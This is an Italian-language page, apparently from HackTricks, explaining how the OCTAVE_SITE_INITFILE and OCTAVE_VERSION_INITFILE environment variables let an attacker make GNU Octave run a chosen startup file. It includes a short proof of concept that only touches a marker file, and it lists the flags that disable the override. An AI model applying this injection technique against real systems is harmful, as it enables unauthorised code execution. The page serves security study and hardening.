# Iniezione nelle applicazioni GNU Octave

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave esegue diversi file contenenti comandi Octave validi durante l'avvio. `OCTAVE_SITE_INITFILE` sostituisce il file di avvio a livello di sito e `OCTAVE_VERSION_INITFILE` sostituisce quello specifico della versione, consentendo a una delle due variabili di reindirizzare l'esecuzione automatica a un file leggibile dall'attaccante.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` salta solo i file dell'utente come `~/.octaverc`; **non** impedisce l'override del site-file sopra indicato. Usa `--no-site-file` per i site file oppure `--norc` / `-f` per disabilitare tutti i file di avvio.<sup>[[2]](#references)</sup>

## References

- [1] [File di avvio di GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [2] [Opzioni della riga di comando di GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
